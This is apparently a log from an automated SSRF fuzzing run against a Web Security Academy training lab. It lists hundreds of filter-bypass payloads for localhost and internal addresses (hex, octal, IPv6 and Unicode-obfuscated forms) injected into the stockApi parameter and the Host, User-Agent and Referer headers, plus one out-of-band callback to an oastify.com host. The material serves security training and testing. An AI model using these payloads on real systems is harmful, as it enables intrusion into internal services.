[2025-03-26T07:24:09.749247] method=POST param='stockApi' → https://	bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:01.225568] method=GET param='header: user-agent' → https://localhost#@stock.weliketoshop.net || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:01.558761] method=GET param='header: host' → https://[::]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:01.912533] method=GET param='header: host' → https://[::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:02.278260] method=GET param='header: host' → https://[::ffff:0.0.0.0]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:02.627811] method=GET param='header: host' → https://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:02.986739] method=GET param='header: host' → https://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:03.339686] method=GET param='header: host' → https://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:03.683730] method=GET param='header: host' → https://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:04.019686] method=GET param='header: host' → https://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:04.361576] method=GET param='header: host' → https://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:04.721686] method=GET param='header: host' → https://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:05.093637] method=GET param='header: host' → https://[0000::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:05.433681] method=GET param='header: host' → https://[0000:0000:0000:0000:0000:0000:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:05.789651] method=GET param='header: host' → https://[0000:0000:0000:0000:0000:0000:0000:0001]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:06.146255] method=GET param='header: host' → https://@0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:06.487678] method=GET param='header: host' → https://\l\o\c\a\l\h\o\s\t/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:06.843995] method=GET param='header: host' → https://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:07.203093] method=GET param='header: host' → https://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:07.572458] method=GET param='header: host' → https://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:07.916056] method=GET param='header: host' → https://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:08.280498] method=GET param='header: host' → https://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:08.670213] method=GET param='header: host' → https://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:09.031809] method=GET param='header: host' → https://00000177.00000000.00000000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:09.372063] method=GET param='header: host' → https://0177.0000.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:09.725553] method=GET param='header: host' → https://017700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:10.067548] method=GET param='header: host' → https://0⑰700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:10.423352] method=GET param='header: host' → https://0x00000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:10.765922] method=GET param='header: host' → https://0x100000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:11.111968] method=GET param='header: host' → https://0x17f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:11.460057] method=GET param='header: host' → https://0x17f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:11.804008] method=GET param='header: host' → https://0x7F.0.0000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:12.132261] method=GET param='header: host' → https://0x7F.0.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:12.471932] method=GET param='header: host' → https://0x7f.0x00.0x00.0x01/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:12.842735] method=GET param='header: host' → https://0x7f.0x00.0x00.0x02/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:13.196072] method=GET param='header: host' → https://0x7F.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:13.574272] method=GET param='header: host' → https://0x7f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:13.932909] method=GET param='header: host' → https://0x7f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:14.268678] method=GET param='header: host' → https://127.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:14.624578] method=GET param='header: host' → https://1㉗.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:14.962479] method=GET param='header: host' → https://⑫7.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:15.319999] method=GET param='header: host' → https://127.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:15.677316] method=GET param='header: host' → https://1㉗.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:16.034048] method=GET param='header: host' → https://⑫7.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:16.392072] method=GET param='header: host' → https://127.000000000000000.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:16.747852] method=GET param='header: host' → https://127.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:17.111439] method=GET param='header: host' → https://2130706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:17.448360] method=GET param='header: host' → https://21307064㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:17.786306] method=GET param='header: host' → https://2130706㊸3/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:18.126383] method=GET param='header: host' → https://21㉚706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:18.483137] method=GET param='header: host' → https://2⑬0706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:18.829333] method=GET param='header: host' → https://㉑30706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:19.195573] method=GET param='header: host' → https://㉑㉚⑦⓪⑥④㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:19.553314] method=GET param='header: host' → https://45080379393/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:19.896173] method=GET param='header: host' → https://localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:20.235131] method=GET param='header: host' → https://­localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:20.581006] method=GET param='header: host' → https://͏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:20.927290] method=GET param='header: host' → https://᠋localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:21.281746] method=GET param='header: host' → https://᠌localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:21.623459] method=GET param='header: host' → https://᠍localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:21.965482] method=GET param='header: host' → https://᠎localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:22.312897] method=GET param='header: host' → https://᠏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:22.648422] method=GET param='header: host' → https://​localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:23.002399] method=GET param='header: host' → https://⁠localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:23.356747] method=GET param='header: host' → https://⁤localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:23.721905] method=GET param='header: host' → https://localhoﬆ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:24.068262] method=GET param='header: host' → https://lo㎈host/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:24.409172] method=GET param='header: host' → https://localhoﬅ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:24.763439] method=GET param='header: host' → http://[::]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:25.118018] method=GET param='header: host' → http://[::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:25.460977] method=GET param='header: host' → http://[::ffff:0.0.0.0]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:25.810015] method=GET param='header: host' → http://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:26.148045] method=GET param='header: host' → http://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:26.486491] method=GET param='header: host' → http://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:26.847461] method=GET param='header: host' → http://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:27.185150] method=GET param='header: host' → http://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:27.530256] method=GET param='header: host' → http://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:27.883086] method=GET param='header: host' → http://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:28.241304] method=GET param='header: host' → http://[0000::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:28.598758] method=GET param='header: host' → http://[0000:0000:0000:0000:0000:0000:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:28.953333] method=GET param='header: host' → http://[0000:0000:0000:0000:0000:0000:0000:0001]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:29.292723] method=GET param='header: host' → http://@0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:29.636009] method=GET param='header: host' → http://\l\o\c\a\l\h\o\s\t/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:30.007326] method=GET param='header: host' → http://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:30.366018] method=GET param='header: host' → http://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:30.715713] method=GET param='header: host' → http://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:31.058445] method=GET param='header: host' → http://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:31.413258] method=GET param='header: host' → http://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:31.771147] method=GET param='header: host' → http://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:32.112730] method=GET param='header: host' → http://00000177.00000000.00000000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:32.481925] method=GET param='header: host' → http://0177.0000.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:32.878883] method=GET param='header: host' → http://017700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:33.222953] method=GET param='header: host' → http://0⑰700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:33.565836] method=GET param='header: host' → http://0x00000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:33.904916] method=GET param='header: host' → http://0x100000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:34.270797] method=GET param='header: host' → http://0x17f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:34.605985] method=GET param='header: host' → http://0x17f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:34.963969] method=GET param='header: host' → http://0x7F.0.0000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:35.310384] method=GET param='header: host' → http://0x7F.0.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:35.650375] method=GET param='header: host' → http://0x7f.0x00.0x00.0x01/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:36.008664] method=GET param='header: host' → http://0x7f.0x00.0x00.0x02/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:36.338658] method=GET param='header: host' → http://0x7F.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:36.679778] method=GET param='header: host' → http://0x7f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:37.023320] method=GET param='header: host' → http://0x7f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:37.381247] method=GET param='header: host' → http://127.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:37.719742] method=GET param='header: host' → http://1㉗.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:38.078253] method=GET param='header: host' → http://⑫7.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:38.416010] method=GET param='header: host' → http://127.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:38.775955] method=GET param='header: host' → http://1㉗.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:39.132781] method=GET param='header: host' → http://⑫7.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:39.469974] method=GET param='header: host' → http://127.000000000000000.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:39.811198] method=GET param='header: host' → http://127.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:40.152076] method=GET param='header: host' → http://2130706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:40.494601] method=GET param='header: host' → http://21307064㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:40.842755] method=GET param='header: host' → http://2130706㊸3/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:41.196574] method=GET param='header: host' → http://21㉚706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:41.537894] method=GET param='header: host' → http://2⑬0706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:41.893426] method=GET param='header: host' → http://㉑30706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:42.259739] method=GET param='header: host' → http://㉑㉚⑦⓪⑥④㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:42.612822] method=GET param='header: host' → http://45080379393/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:42.963484] method=GET param='header: host' → http://localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:43.305567] method=GET param='header: host' → http://­localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:43.645884] method=GET param='header: host' → http://͏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:44.005479] method=GET param='header: host' → http://᠋localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:44.342763] method=GET param='header: host' → http://᠌localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:44.698941] method=GET param='header: host' → http://᠍localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:45.039136] method=GET param='header: host' → http://᠎localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:45.393561] method=GET param='header: host' → http://᠏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:45.731833] method=GET param='header: host' → http://​localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:46.088230] method=GET param='header: host' → http://⁠localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:46.453824] method=GET param='header: host' → http://⁤localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:46.804019] method=GET param='header: host' → http://localhoﬆ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:47.161020] method=GET param='header: host' → http://lo㎈host/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:47.526440] method=GET param='header: host' → http://localhoﬅ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:47.861646] method=GET param='header: host' → https://localhost#@stock.weliketoshop.net || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_6.json 
[2025-03-26T07:45:48.220360] method=POST param='header: referer' → https://[::]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:48.600926] method=POST param='header: referer' → https://[::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:48.985774] method=POST param='header: referer' → https://[::ffff:0.0.0.0]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:49.313237] method=POST param='header: referer' → https://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:49.692243] method=POST param='header: referer' → https://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:50.071702] method=POST param='header: referer' → https://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:50.453558] method=POST param='header: referer' → https://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:50.839624] method=POST param='header: referer' → https://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:51.215591] method=POST param='header: referer' → https://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:51.610281] method=POST param='header: referer' → https://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:51.951642] method=POST param='header: referer' → https://[0000::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:52.321084] method=POST param='header: referer' → https://[0000:0000:0000:0000:0000:0000:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:52.674757] method=POST param='header: referer' → https://[0000:0000:0000:0000:0000:0000:0000:0001]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:53.063693] method=POST param='header: referer' → https://@0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:53.397769] method=POST param='header: referer' → https://\l\o\c\a\l\h\o\s\t/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:53.719449] method=POST param='header: referer' → https://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:54.091068] method=POST param='header: referer' → https://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:54.423027] method=POST param='header: referer' → https://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:54.749190] method=POST param='header: referer' → https://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:55.118777] method=POST param='header: referer' → https://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:55.487393] method=POST param='header: referer' → https://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:55.863725] method=POST param='header: referer' → https://00000177.00000000.00000000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:56.242751] method=POST param='header: referer' → https://0177.0000.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:56.602210] method=POST param='header: referer' → https://017700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:56.985673] method=POST param='header: referer' → https://0⑰700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
